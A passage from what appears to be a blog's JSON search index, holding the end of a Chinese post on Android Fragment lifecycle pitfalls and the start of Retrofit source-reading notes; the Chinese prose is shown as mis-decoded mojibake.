†åœ¨Activityä¸­çš„é€»è¾‘æ‰¿è½½è¿‡æ¥,ä»¥å¼‚æ­¥çš„æ–¹å¼å‡è½»ä¸»çº¿ç¨‹çš„å‹åŠ›ï¼Œå¯¹å¤–æä¾›äº†è·å–(onViewCreated)ï¼Œæ“ä½œ(Transaction)ï¼Œé”€æ¯(onDestoryView)è¿™äº›ä¸šåŠ¡å¯¹è±¡çš„å›è°ƒæ–¹æ³•ã€‚ç”±äºAndroidæœ¬èº«å°±æ˜¯å¼‚æ­¥çš„ç³»ç»Ÿï¼Œç³»ç»Ÿéšæ—¶(asynchronous)å¯èƒ½ä¼šå¯¹Fragmentçš„èµ„æºè¿›è¡Œæ›´æ”¹ï¼Œå¼€å‘è€…çš„ä»£ç ä¹Ÿéšæ—¶(asynchronous)ä¼šå¯¹è¿™äº›èµ„æºè¿›è¡Œæ“ä½œã€‚ç”±äºå­˜åœ¨è¿™ç§æ— æ³•æ”¹å˜çš„â€™å¹¶å‘â€™ç°çŠ¶ï¼ŒFragmentä¸å¾—ä¸ä¸ºä¿è¯èµ„æºçš„ä¸€è‡´æ€§è€Œä¸»åŠ¨æŠ›å‡ºä¸€äº›é”™è¯¯ã€‚æœ¬æ–‡æœ‰æ„å¿½ç•¥æ‰äº†ä¸€äº›transitionåŠ¨ç”»(ä½¿ç”¨äº†hardwareLayer)å’ŒLoaderåŠ è½½çš„ç»†èŠ‚ï¼Œå¸Œæœ›èƒ½å¤Ÿå¯¹æ—¥å¸¸å¼€å‘æœ‰ç‚¹å¸®åŠ©ã€‚ æ›´æ–°ï¼Œæ‹¿æ¥ä¸»ä¹‰ ä¸€ä»½2013å¹´çš„æ–‡æ¡£,ä¸è¦åœ¨FragmentActivity#onResumeä¸­beginTransactionï¼Œéœ€è¦çš„è¯ï¼Œåœ¨onPostResumeæˆ–è€…onPostResumeä¸­åšã€‚ä¹Ÿä¸è¦åœ¨onActivityResulté‡Œé¢å»åšï¼ŒonActivityResultä¼šè§¦å‘onPostResumeï¼Œæ¨è¿Ÿåˆ°onPostResumeå»åšã€‚ [å…³äºCan not perform this action after onSaveInstanceState] ä»Šå¤©å¾ˆå¥½å¥‡çš„æŸ¥äº†ä¸‹FragmentActivityçš„onBackpressedç‰¹åœ°æŠŠsupportLibVersionæ”¹æˆ25.3.0çœ‹ä¸‹ï¼Œè¿˜æ˜¯@Override public void onBackPressed() { if (!mFragments.getSupportFragmentManager().popBackStackImmediate()) { super.onBackPressed(); } } æ”¹åˆ°26.1.0ä¹‹åå°±å˜æˆ@Override public void onBackPressed() { FragmentManager fragmentManager = mFragments.getSupportFragmentManager(); final boolean isStateSaved = fragmentManager.isStateSaved(); if (isStateSaved &amp;&amp; Build.VERSION.SDK_INT &lt;= Build.VERSION_CODES.N_MR1) { // Older versions will throw an exception from the framework // FragmentManager.popBackStackImmediate(), so we&#39;ll just // return here. The Activity is likely already on its way out // since the fragmentManager has already been saved. return; } if (isStateSaved || !fragmentManager.popBackStackImmediate()) { super.onBackPressed(); } } ç‰¹æ„æŸ¥äº†ä¸‹aospçš„git logï¼ŒGeorge Mount &#109;&#x6f;&#x75;&#110;&#x74;&#64;&#x67;&#x6f;&#111;&#x67;&#108;&#101;&#x2e;&#x63;&#x6f;&#109; Tue Feb 21 11:04:14 2017 -0800ã€‚`java@Overridepublic void onBackPressed() { if (!mFragments.getSupportFragmentManager().popBackStackImmediate()) { FragmentManager fragmentManager = mFragments.getSupportFragmentManager(); final boolean isStateSaved = fragmentManager.isStateSaved(); if (isStateSaved &amp;&amp; Build.VERSION.SDK_INT &lt;= Build.VERSION_CODES.N_MR1) { // Older versions will throw an exception from the framework // FragmentManager.popBackStackImmediate(), so weâ€™ll just // return here. The Activity is likely already on its way out // since the fragmentManager has already been saved. return; } if (isStateSaved || !fragmentManager.popBackStackImmediate()) {super.onBackPressed();}}`æ€ä¹ˆè¯´å‘¢ï¼ŒfragmentManager.isStateSaved()å¯¹å¤–æš´éœ²mStateSavedè¿˜æ˜¯æŒºå¼€æ˜çš„ã€‚ Jake Whartonå»ºè®®ä¸è¦ç”¨fragmentçš„addtoBackStackï¼Œè¿™æ˜¯Redditä¸Šçš„è®¨è®ºï¼Œæœ€åJakeæœ¬äººå‡ºæ¥é€‰æ‹©äº†æœ€ä½³è§£è¯»(Nailed it) è¿™ç§åœ¨Activityä¸­æŒæœ‰mFragment,æˆ–è€…åœ¨Adapterä¸­æŒæœ‰mFragmentsçš„åšæ³•æ˜¯æœ‰å¯èƒ½å‡ºé”™çš„äº²èº«é‡åˆ°è¿‡è¿™ç§äº‹ï¼Œåœ¨Activityä¸­æŒæœ‰äº†mFragments[]ï¼Œåœ¨ç‰¹å®šçš„æ—¶æ®µï¼ˆå¯èƒ½stateSaveå·²ç»è°ƒç”¨è¿‡äº†ï¼‰ï¼Œå†å»debugæŸ¥çœ‹ï¼Œå‘ç°mFragmentsä¸­çš„æ‰€æœ‰fragmentéƒ½å¤„äºä¸€ç§è¢«detachçš„çŠ¶æ€(æ‰€æœ‰çš„booleanè¢«è®¾ç½®ä¸ºfalseï¼Œæ‰€æœ‰çš„fieldè¢«è®¾ç½®ä¸ºnull)ã€‚è¿™ä»¶äº‹çš„åŸå› æ˜¯åœ¨onSaveInstanceå’ŒonRestoreInstanceä¹‹é—´å‘ç”Ÿçš„ã€‚å¤ç°å‰ææ¡ä»¶æ˜¯viewPager.setOffScreenLimitè®¾ç½®çš„æ¯”è¾ƒå¤§,æ¯”å¦‚mDatas.size()-1å…·ä½“æ¥è¯´å°±æ˜¯ï¼šFragmentåœ¨onRestoreInstanceä¹‹åéƒ½æ˜¯é€šè¿‡åå°„é‡æ–°æ¢å¤çš„ï¼Œè€Œåœ¨FragmentStatePagerAdapterä¸­æœ‰è¿™ä¹ˆä¸€æ®µï¼Œ @Override public void restoreState(Parcelable state, ClassLoader loader) { if (state != null) { Iterable&lt;String&gt; keys = bundle.keySet(); for (String key: keys) { if (key.startsWith(&quot;f&quot;)) { int index = Integer.parseInt(key.substring(1)); Fragment f = mFragmentManager.getFragment(bundle, key); if (f != null) { while (mFragments.size() &lt;= index) { mFragments.add(null); } f.setMenuVisibility(false); mFragments.set(index, f); } else { Log.w(TAG, &quot;Bad fragment at key &quot; + key); } } } } } è¿™ä¸ªmFragmentsæ˜¯FragmentStatePagerAdapterçš„ç§æœ‰æˆå‘˜å˜é‡ï¼Œåœ¨æ¢å¤çŠ¶æ€ä¹‹åï¼Œå°†ä¸å†ä½¿ç”¨å¼€å‘è€…çš„mAdapterä¸­æŒæœ‰çš„fragmentsï¼Œç›´æ¥ä½¿ç”¨æ¢å¤çŠ¶æ€è¿‡æ¥çš„fragmentsï¼ˆè¿™ä¸ªè¦çœ‹ViewPagerçš„populateæ–¹æ³•äº†ï¼ŒoffscreenLimitæ¯”è¾ƒå¤§çš„æ—¶å€™å°±ä¸ä¼šè°ƒç”¨adapterçš„instantiateItemï¼‰ã€‚æ­¤æ—¶ï¼ŒUIä¸Šæ˜¾ç¤ºçš„å°†ä¸å†æ˜¯mAdapterä¸­çš„ä¸œè¥¿ã€‚è¿™ä»¶äº‹æœ¬è´¨ä¸Šè¿˜æ˜¯å¼€å‘è€…è‡ªå·±æ²¡å¤„ç†å¥½saveStateè¿™ä»¶äº‹ã€‚ æ­£ç¡®çš„åšæ³•æ˜¯åœ¨æ­¤æ—¶é€šè¿‡getSupportFragmentManagerå»getFragments(ä¸çŸ¥é“è¿™ä¸ªæ˜¯ä¸æ˜¯open api)ã€‚å¾—åˆ°ä¸€ä¸ªlistï¼Œè¿™é‡Œé¢å­˜ç€è¢«é‡æ–°åˆ›å»ºçš„fragmentçš„å®ä¾‹ã€‚å› æ•…æ­¤æ—¶å¤–éƒ¨æŒæœ‰çš„fragmentå®ä¾‹å·²ç»æ˜¯æ— æ•ˆçš„å®ä¾‹äº†ã€‚è§£å†³æ–¹å¼ï¼šçœ‹è§FragmentStatePagerAdapterçš„restoreStateæ˜¯æ€ä¹ˆæ‰¾åˆ°å½“å‰UIä¸­æ˜¾ç¤ºçš„Fragmentçš„äº†å§ï¼Œç›´æ¥å¤åˆ¶ç²˜è´´ï¼ŒmAdapterå¤å†™restoreStateæ–¹æ³•ï¼Œåœ¨è¿™é‡Œé¢ç…§ç€Fragment f = mFragmentManager.getFragment(bundle, key)ä¸€ä¸ªä¸ªæ‰¾åˆ°å½“å‰UIä¸Šæ˜¾ç¤ºçš„Fragmentï¼Œä¸€ä¸ªä¸ªå¡«å……åˆ°mAdapterä¸­çš„listé‡Œé¢ã€‚ï¼ˆæˆ–è®¸æœ‰æ›´ä¼˜é›…çš„å®ç°ï¼Œè¿™é‡Œåªæ˜¯ä¸€ç§äº²æµ‹å¯è¡Œçš„æ–¹å¼ï¼‰ Reference Fragmentçš„onAttachå’ŒonDetachä»€ä¹ˆæ—¶å€™ä¼šè°ƒç”¨ Glideæ˜¯æ€ä¹ˆè·Ÿç”Ÿå‘½å‘¨æœŸæŒ‚é’©çš„ Activityçš„onSaveInstanceStateä»€ä¹ˆæ—¶å€™ä¼šè°ƒç”¨ Activity-LifeCycle Fragmentsæ–‡æ¡£ä¸è¦ä¾èµ–Implementation Detail,æºç éšæ—¶ä¼šå˜ï¼Œå®˜æ–¹çš„æ–‡æ¡£æ‰æ˜¯å€¼å¾—ä¾èµ–çš„ã€‚","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"Retrofitæºç é˜…è¯»ç¬”è®°","date":"2017-07-01T23:03:00.000Z","path":"2017/07/01/2017-07-01-retrofit-related-topics/","text":"This is gonna be nastyâ€¦â€¦ TL;DR 1. Retrofit1.1 ä½¿ç”¨æ–¹æ³•Retrofitæœ¬èº«å¹¶ä¸å±€é™äºAndroidå¹³å°ï¼Œjavaåº”ç”¨ä¹Ÿå¯ä»¥ç”¨æ¥å’ŒæœåŠ¡å™¨æ²Ÿé€šã€‚Retrofitä¸€èˆ¬çš„ç”¨æ³•çœ‹ä¸Šå»å¾ˆç®€å• public interface GitHub { @GET(&quot;/repos/{owner}/{repo}/contributors&quot;) Call&lt;List&lt;Contributor&gt;&gt; contributors( @Path(&quot;owner&quot;) String owner, @Path(&quot;repo&quot;) String repo); } Retrofit retrofit = new Retrofit.Builder() .baseUrl(API_URL) // end_point .addConverterFactory(GsonConverterFactory.create()) .build(); // Create an instance of our GitHub API interface. GitHub github = retrofit.create(GitHub.class); // Create a call instance for looking up Retrofit contributors. Call&lt;List&lt;Contributor&gt;&gt; call = github.contributors(&quot;square&quot;, &quot;retrofit&quot;); // Fetch and print a list of the contributors to the library. List&lt;Contributor&gt; contributors = call.execute().body(); for (Contributor contributor : contributors) { System.out.println(contributor.login + &quot; (&quot; + contributor.contributions + &quot;)&quot;); } å…³é”®æ¥çœ‹è¿™æ®µ retroft.create ,é‡ç‚¹éƒ½åœ¨è¿™é‡Œé¢ã€‚å…³é”®çš„ä»£ç å°±åœ¨è¿™ä¸‰è¡Œé‡Œé¢äº† å¤§åé¼é¼çš„åŠ¨æ€ä»£ç† @SuppressWarnings(&quot;unchecked&quot;) // Single-interface proxy creation guarded by parameter safety. public &lt;T&gt; T create(final Class&lt;T&gt; service) { Utils.validateServiceInterface(service); if (validateEagerly) { eagerlyValidateMethods(service); } return (T) Proxy.newProxyInstance(service.getClassLoader(), new Class&lt;?&gt;[] { service }, new InvocationHandler() { private final Platform platform = Platform.get(); @Override public Object invoke(Object proxy, Method method, @Nullable Object[] args) throws Throwable { // If the method is a method from Object then defer to normal invocation. if (method.getDeclaringClass() == Object.class) { return method.invoke(this, args); } if (platform.isDefaultMethod(method)) { return platform.invokeDefaultMethod(method, service, proxy, args); } ServiceMethod&lt;Object, Object&gt; serviceMethod = (ServiceMethod&lt;Object, Object&gt;) loadServiceMethod(method); OkHttpCall&lt;Object&gt; okHttpCall = new OkHttpCall&lt;&gt;(serviceMethod, args); return serviceMethod.adapt(okHttpCall); } }); } ä¸»è¦å°±è¿™ä¸‰ä¸ªæ–¹æ³• ServiceMethod serviceMethod = loadServiceMethod(method);OkHttpCall okHttpCall = new OkHttpCall&lt;&gt;(serviceMethod, args);return serviceMethod.callAdapter.adapt(okHttpCall); 1.2 ç¬¬ä¸€ä¸ªæ–¹æ³•ä»¥åŠServiceMethodçš„åˆ›å»ºloadServiceMethod(Method)ä¼šæŸ¥æ‰¾invokeçš„æ—¶å€™ä¼šæŸ¥æ‰¾methodCacheä¸­æœ‰æ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œæ²¡æœ‰çš„è¯è°ƒç”¨Builderæ–¹æ³•åˆ›å»ºä¸€ä¸ªServiceMethodå®ä¾‹å¹¶æ”¾å…¥cahceã€‚çœ‹ä¸€çœ‹è¿™ä¸ªBuilderçš„æ„é€ å‡½æ•° ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯æŠŠBuilderä¸­çš„å‚æ•°å¼•ç”¨èµ‹å€¼ç»™ServiceMethodå®ä¾‹ã€‚ result = new ServiceMethod.Builder(this, method).build(); public Builder(Retrofit retrofit, Method method) { this.retrofit = retrofit; //clientåˆ›å»ºretrofitæ—¶å¯ä»¥è®¾å®šä¸€äº›å±æ€§ this.method = method; this.methodAnnotations = method.getAnnotations(); this.parameterTypes = method.getGenericParameterTypes(); this.parameterAnnotationsArray = method.getParameterAnnotations(); } æ ¹æ®ServiceMethodçš„å˜é‡ååŸºæœ¬ä¸Šèƒ½å¤ŸçŒœåˆ°å„è‡ªçš„ç”¨å¤„ï¼Œæ¯”å¦‚httpMethodï¼ˆGETã€POSTï¼‰, contentTypeï¼ˆMimeTypeï¼‰ public ServiceMethod build() { // 1.åˆ›å»ºcallAdapter,è°ƒç”¨retrofitå¯¹è±¡è®¾å®šçš„callAdapter,ä¾‹å¦‚RxjavAdapter,æ³¨æ„è¿™é‡Œé¢çš„å®ç°æ˜¯ä¾¿åˆ©retrofitå¯¹è±¡çš„adapterFactoriesï¼Œæ‰¾åˆ°ä¸€ä¸ªå°±è¿”å›ã€‚æ‰¾ä¸åˆ°çš„è¯ä¼šä¸¢å‡ºæ¥ä¸€ä¸ªIllegalArgumentException callAdapter = createCallAdapter(); //callAdapterçš„ä½œç”¨ å°±æ˜¯å°†retrofit.Callçš„Callè½¬æˆä¸€ä¸ªTã€‚ä¾‹å¦‚ä¸Šé¢å°±æ˜¯æŠŠCall&lt;List&lt;Contributor&gt;&gt;è½¬æˆä¸€ä¸ªList&lt;Contributor&gt;ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯ä¸Šé¢æåˆ°çš„æœ€é‡è¦çš„ä¸‰ä¸ªæ–¹æ³•ä¸­çš„ç¬¬ä¸‰éƒ¨ adaptï¼ˆokHttpCallï¼‰ã€‚å¯ä»¥è®¤ä¸ºæ˜¯æ‹¿ç€ä¸€ä¸ªå·²ç»åˆ›å»ºå¥½çš„okHttpçš„Callå»åšäº‹æƒ…ï¼Œåœ¨é€‚å½“çš„æ—¶å€™å°†ç½‘ç»œè¿”å›ç»“æœè½¬æˆç”¨æˆ·äº‹å…ˆå®šä¹‰å¥½çš„resposeç±»å‹ã€‚ //è¿™ä¸€æ­¥è¿”å›ä¸€ä¸ªjava.lang.reflect.Type ï¼Œè¿™ä¸ªclassçš„åŸºæœ¬ä½œç”¨å°±æ˜¯æ ¹æ®æ³›å‹æ¥ç¡®å®šresponseçš„classã€‚ responseType = callAdapter.responseType(); //2.åˆ›å»ºç”¨äºresponseå’ŒRequestçš„converterã€‚ responseConverter = createResponseConverter(); for (Annotation annotation : methodAnnotations) { parseMethodAnnotation(annotation); //è¿™é‡Œé¢å°±æ˜¯æŠŠ@GETå˜æˆ&quot;GET&quot;è¿™ä¸ªStringï¼Œè¡¨ç¤ºå½“å‰æ–¹æ³•æ˜¯ä¸€ä¸ªGETè¯·æ±‚ } int parameterCount = parameterAnnotationsArray.length; //3.åˆ›å»ºParameterHandler parameterHandlers = new ParameterHandler&lt;?&gt;[parameterCount]; for (int p = 0; p &lt; parameterCount; p++) { Type parameterType = parameterTypes[p]; Annotation[] parameterAnnotations = parameterAnnotationsArray[p]; if (parameterAnnotations == null) { throw parameterError(p, &quot;No Retrofit annotation found.&quot;); } parameterHandlers[p] = parseParameter(p, parameterType, parameterAnnotations); //å…³é”®çœ‹è¿™ä¸ªæ–¹æ³• private ParameterHandler&lt;?&gt; parseParameter(int p, Type parameterType, Annotation[] annotations) ç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºå½“å‰çš„æ•°ç»„index ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºæƒ³è¦çš„Responseç±»å‹ ç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤ºè¯¥æ–¹æ³•ä¸Šçš„æ³¨è§£ï¼Œå°±æ˜¯@é‚£äº›ä¸œè¥¿ æ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨ private ParameterHandler&lt;?&gt; parseParameterAnnotation( int p, Type type, Annotation[] annotations, Annotation annotation)æ–¹æ³•æ¥åˆ¤æ–­å„ç§Httpæ–¹æ³•ï¼Œè¿™ä¸€æ®µä»£ç æœ‰300å¤šè¡Œã€‚ã€‚ã€‚ã€‚çœ‹å®Œæœ‰åŠ©äºæŒæ¡Httpåè®®ã€‚ } return new ServiceMethod&lt;&gt;(this); } } å…³é”®æ˜¯è¿™ä¸‰ä¸ªæ–¹æ³•ï¼ŒBuilderåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å®Œæˆäº†ä¸€äº›å˜é‡çš„èµ‹å€¼ createCallAdapter â€”&gt; retrofit.callAdapter(returnType, annotations); ä»adapterFactories(æ˜¾ç„¶å¯ä»¥æœ‰å¤šä¸ª)ä¸­éå†ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªå°±è¿”å›ã€‚å·²ç»å®ç°çš„çš„æœ‰ä¸‰ç§ç­–ç•¥ï¼ŒDefaultCallAdapterFactoryã€ExecutorCallAdapterFactoryå’ŒRxjavaCallAdapterFactoryã€‚æ˜¾ç„¶ç”¨æˆ·å¯ä»¥åœ¨åˆ›å»ºretrofitå®ä¾‹çš„è¿‡ç¨‹ä¸­installè‡ªå·±çš„callAdapterå®ç°ã€‚å†æ¬¡å¼ºè°ƒè¿™ä¸ªCallAdapterçš„ä½œç”¨ï¼Œå°±æ˜¯å°†Retrofitçš„Call adaptæˆå¯¹åº”çš„Response classçš„å®ä¾‹ã€‚ createResponseConverter â€”&gt; retrofit.responseBodyConverter(responseType, annotations);Retrofit2.Converter&lt;F, T&gt; (fromå’ŒToï¼Œæˆ‘çŒœçš„) Convert objects to and from their representation in HTTP. Instances are created by {@linkplain Factory a factory} which is {@linkplain Retrofit.Builder#addConverterFactory(Factory) installed} into the {@link Retrofit} instance. ä»retrofitå¯¹è±¡çš„converterFactoriesï¼ˆå¯ä»¥æœ‰å¤šä¸ªï¼ŒåŸå› åœ¨äºserveræœ‰æ—¶å€™ä¼šè¿”å›jsonï¼Œæœ‰æ—¶å€™ä¼šè¿”å›protocolBufferï¼Œæœ‰æ—¶å€™è¿”å›xmlï¼Œresponseå›æ¥çš„æ—¶å€™ä¼šä¸€ä¸ªä¸ªé—®ï¼Œè¿™ä¸€ç‚¹jake Whartonå¤šæ¬¡æåˆ°è¿‡ï¼‰ä¸­éå†ï¼Œæ‰¾åˆ°ä¸€ä¸ªå°±è¿”å›ã€‚ç¡®åˆ‡çš„è¯´ï¼Œæ˜¯æ‰¾åˆ°ä¸€ä¸ªèƒ½å¤Ÿå¤„ç†çš„ã€‚ åˆ›å»ºparameterHandlersåº”è¯¥å¯ä»¥çŒœåˆ°ï¼Œè¿™ä¸€æ­¥å°±æ˜¯æŠŠç”¨æˆ·å®šä¹‰çš„æ³¨è§£è½¬æ¢æˆå‘èµ·ç½‘ç»œè¯·æ±‚æ—¶éœ€è¦å¸¦ä¸Šçš„å‚æ•° private ParameterHandler&lt;?&gt; parseParameterAnnotation(int p, Type type, Annotation[] annotations, Annotation annotation) è¿™ä¸ªæ–¹æ³•éšä¾¿å±•å¼€ä¸€ç‚¹ï¼Œå…³æ³¨ç¬¬ä¸‰ä¸ªå‚æ•°å’Œç¬¬å››ä¸ªå‚æ•° ä¾‹å¦‚ public interface GitHub { @GET(&quot;/repos/{owner}/{repo}/contributors&quot;) Call&lt;List&lt;Contributor&gt;&gt; contributors( @Path(&quot;owner&quot;) String owner, @Path(&quot;repo&quot;) String repo); } ServiceMethodèµ°åˆ°è¿™ä¸€æ­¥ï¼Œannotationså°±è¡¨ç¤º @Path(â€œownerâ€) String ownerã€‚æ³¨æ„è¿™é‡Œçš„@PATHæ˜¯æ³¨è§£ç±»ï¼Œå¯ä»¥æŠŠå®ƒå½“æˆä¸€ä¸ªwrapperï¼Œè¿™é‡Œé¢å°±è°ƒç”¨äº†path.value()ã€‚ else if (annotation instanceof Path) { Path path = (Path) annotation; String name = path.value(); // è°ƒç”¨è¯¥æ–¹æ³•æ—¶ä¼ å…¥çš„String validatePathName(p, name); Converter&lt;?, String&gt; converter = retrofit.stringConverter(type, annotations); return new ParameterHandler.Path&lt;&gt;(name, converter, path.encoded()); } ParameterHandler.Path&lt;&gt;åœ¨ParameterHandlerè¿™ä¸ªç±»é‡Œé¢ï¼Œçœ‹ä¸€ä¸‹ç»“æ„Pathè¿™ä¸ªclassä¸­å…³é”®çš„æ–¹æ³•apply: @Override void apply(RequestBuilder builder, @Nullable T value) throws IOException { builder.addPathParam(name, valueConverter.convert(value), encoded); } å†å¾€ä¸‹èµ°ï¼š relativeUrl = relativeUrl.replace(&quot;{&quot; + name + &quot;}&quot;, canonicalizeForPath(value, encoded)); applyè¿™ä¸ªæ–¹æ³•ä¼šåœ¨æ„å»ºRequestæ—¶ç”±RequestBilderè°ƒç”¨ï¼Œä»¥ä¸Šé¢çš„å®ä¾‹ä¸ºä¾‹å­ï¼Œnameå°±æ˜¯â€ownerâ€ ,valueå°±æ˜¯è°ƒç”¨è¯¥æ–¹æ³•æ—¶ä¼ è¿›æ¥çš„å€¼ï¼Œå…¶å®å°±åªæ˜¯Stirng.replace()æ–¹æ³•ã€‚åˆ°è¿™é‡Œï¼ŒBuidlerå·²ç»å®Œæˆäº† å‡†å¤‡callAdapterï¼Œ createResponseConverter å’Œå¡«å……parameterHandlersæ•°ç»„çš„ä»»åŠ¡ç›´æ¥newä¸€ä¸ªServiceMethodå‡ºæ¥å°±å¥½äº† ServiceMethod(Builder&lt;T&gt; builder) { this.callFactory = builder.retrofit.callFactory(); // okhttp3.Call.Factory this.callAdapter = builder.callAdapter; // this.baseUrl = builder.retrofit.baseUrl(); //è¿™ä¸ªå°±æ˜¯ this.responseConverter = builder.responseConverter; // GsonConverter this.httpMethod = builder.httpMethod; //@GET this.relativeUrl = builder.relativeUrl; //@Path this.headers = builder.headers; //@Header this.contentType = builder.contentType; //application/jsonè¿™ç§ this.hasBody = builder.hasBody; this.isFormEncoded = builder.isFormEncoded; this.isMultipart = builder.isMultipart; this.parameterHandlers = builder.parameterHandlers; } ä¸Šé¢æœ€é‡è¦çš„ä¸‰ä¸ªæ–¹æ³•è®²å®Œäº†ç¬¬ä¸€ä¸ªã€‚ 1.3 ç¬¬äºŒä¸ªæ–¹æ³•å’ŒOkHttpCallç¬¬äºŒä¸ªæ–¹æ³•:OkHttpCall okHttpCall = new OkHttpCall&lt;&gt;(serviceMethod, args); OkHttpCallçš„æˆå‘˜å˜é‡ï¼šokhttp3.Call rawCall //ç”¨äºå‘èµ·è¯·æ±‚ServiceMethod&lt;T, ?&gt; serviceMethod; //è¿™å°±æ˜¯åˆšæ‰å®ä¾‹åŒ–çš„serviceMethodå¯¹è±¡è¿™ä¸ªç±»ç›¸å¯¹ç®€å•ï¼Œä¸»è¦çœ‹executeæ–¹æ³• @Override public Response&lt;T&gt; execute() throws IOException { okhttp3.Call call; synchronized (this) { if (executed) throw new IllegalStateException(&quot;Already executed.&quot;); executed = true; // ... call = rawCall; if (call == null) { try { call = rawCall = createRawCall(); } catch (IOException | RuntimeException | Error e) { //... throw e; } } } return parseResponse(call.execute()); //å»ºç«‹è¿æ¥ï¼Œå‘èµ·è¯·æ±‚ï¼Œè§£æresponseéƒ½åœ¨è¿™é‡Œäº†ï¼ˆéƒ½åœ¨ä¸€æ¡çº¿ç¨‹ä¸Šï¼‰ã€‚executeæ˜¯okHttpçš„æ–¹æ³•ã€‚ } è¿˜è®°å¾—æœ€ç®€å•çš„Demoå—ï¼ŒåŒæ­¥æ‰§è¡Œç½‘ç»œè¯·æ±‚Call&lt;List&gt; call = github.contributors(â€œsquareâ€, â€œretrofitâ€);List contributors = call.execute().body();è¿™ä¹Ÿæ˜¯Retrofit2.Call.executeæ–¹æ³•æœ€ç»ˆå°±æ˜¯èµ°åˆ°äº†è¿™é‡Œ createRawCallæ–¹æ³• okhttp3.Request request = serviceMethod.toRequest(args); okhttp3.Call call = serviceMethod.callFactory.newCall(request); if (call == null) { throw new NullPointerException(&quot;Call.Factory returned null.&quot;); } return call; parseRespnseçš„å®ç° Response&lt;T&gt; parseResponse(okhttp3.Response rawResponse) throws IOException { ResponseBody rawBody = rawResponse.body(); //æœ‰ç”¨çš„ä¿¡æ¯åœ¨è¿™é‡Œ // Remove the body&#39;s source (the only stateful object) so we can pass the response along. rawResponse = rawResponse.newBuilder() .body(new NoContentResponseBody(rawBody.contentType(), rawBody.contentLength())) .build(); //æ ¹æ®æœåŠ¡å™¨è¿”å›çš„contentTypeå’ŒcontentLengthåˆ›å»ºä¸€ä¸ªæ–°çš„responseç”¨äºæ£€æµ‹200 int code = rawResponse.code(); if (code &lt; 200 || code &gt;= 300) { try { // Buffer the entire body to avoid future I/O. ResponseBody bufferedBody = Utils.buffer(rawBody); return Response.error(bufferedBody, rawResponse); //åˆ›å»ºä¸€ä¸ªbodyä¸ºnullçš„Retrofit2.Response } finally { rawBody.close(); } } if (code == 204 || code == 205) { rawBody.close(); return Response.success(null, rawResponse); } ExceptionCatchingRequestBody catchingBody = new ExceptionCatchingRequestBody(rawBody); try { T body = serviceMethod.toResponse(catchingBody); //è°ƒç”¨ServiceMethodçš„responseConverterå»è½¬æ¢ï¼Œå‰é¢è¯´è¿‡ï¼ŒresponseConverteræ˜¯åœ¨builderåˆå§‹åŒ–çš„æ—¶å€™æ ¹æ®ç­–ç•¥ï¼Œä»Retrofitçš„converterFactoriesä¸­éå†ï¼Œæ‰¾åˆ°äº†å°±è¿”å›ã€‚ å°±æ˜¯åœ¨è¿™é‡ŒæŠŠbyteè½¬æˆObjectçš„ return Response.success(body, rawResponse); //è¿”å›åˆ›å»ºä¸€ä¸ªbodyä¸ºå®šä¹‰å¥½çš„æ•°æ®ç±»å‹çš„Retrofit2.Responseï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè°ƒç”¨Response.body()å°±èƒ½å¾—åˆ°æ‰€è¦çš„å®ä½“æ•°æ®ã€‚ } catch (RuntimeException e) { // If the underlying source threw an exception, propagate that rather than indicating it was // a runtime exception. catchingBody.throwIfCaught(); throw e; } } è¿™é‡Œå¯ä»¥å¾—çŸ¥ï¼ŒRetrofitå¯¹äºçŠ¶æ€ç çš„å¤„ç†ï¼Œ1XXå’Œ3XXä»¥ä¸Šå…¨éƒ¨èµ°åˆ°errorä¸­ executeæ˜¯åŒæ­¥æ–¹æ³•ï¼Œenqueueæ˜¯å¼‚æ­¥è¯·æ±‚çš„æ–¹æ³•ï¼Œåº•å±‚å…¶å®å°±è°ƒç”¨äº†OkHttp.Call.enqueue()ï¼Œæ‰€ä»¥è¯´Retrofitæœ¬èº«å¹¶ä¸è´Ÿè´£åˆ›å»ºç½‘ç»œè¯·æ±‚ï¼Œçº¿ç¨‹è°ƒåº¦ã€‚åªåšäº†parseRespnseçš„æ–¹æ³•ï¼Œå¦å¤–ï¼ŒOkHttpæœ¬èº«å¹¶ä¸è´Ÿè´£æŠŠResponseæ¨åˆ°ä¸»çº¿ç¨‹ä¸Šï¼Œä¸è¿‡Retrofitåˆ¤æ–­äº†Paltformï¼Œæ˜¯Androidçš„è¯å°±è®¾ç½®äº†é»˜è®¤çš„å›è°ƒçº¿ç¨‹ä¸ºä¸»çº¿ç¨‹ã€‚ public Retrofit build() { //.... Executor callbackExecutor = this.callbackExecutor; if (callbackExecutor == null) { callbackExecutor = platform.defaultCallbackExecutor(); //è¿™é‡Œé¢æœ‰ä¸€ä¸ªMainThreadExecutor } //.... } 1.4 ç¬¬ä¸‰ä¸ªæ–¹æ³•å’ŒAdapterFactoryreturn serviceMethod.callAdapter.adapt(okHttpCall); //è¿™ä¸ªreturnéœ€è¦çš„æ˜¯Object,æ¶‰åŠåˆ°åŠ¨æ€ä»£ç†ï¼Œå¯ä»¥æ— è§†ã€‚ å›å¤´çœ‹ä¸€ä¸‹serviceMethodçš„createCallAdapteræ–¹æ³•ï¼Œå°±æ˜¯ä»retrofitå¯¹è±¡çš„adapterFactoriesä¸­ä¸€ä¸ªä¸ªéå†ï¼š CallAdapter&lt;?, ?&gt; adapter = adapterFactories.get(i).get(returnType, annotations, this)ï¼› æ‰¾åˆ°ä¹‹åå°±è¿”å›ï¼Œé»˜è®¤çš„å®ç°æœ‰DefaultCallAdapterFactoryå’ŒExecutorCallAdapterFactoryä»¥åŠRxjavaCallAdapterFactoryã€‚ // åœ¨DefaultCallAdapterFactoryä¸­çš„å¤„ç†æ–¹å¼æ˜¯ return new CallAdapter&lt;Call&lt;?&gt;&gt;() { @Override public Type responseType() { return responseType; } @Override public &lt;R&gt; Call&lt;R&gt; adapt(Call&lt;R&gt; call) { return call; } }; // ExecutorCallAdapterFactoryçš„å¤„ç†æ–¹å¼æ˜¯ return new CallAdapter&lt;Object, 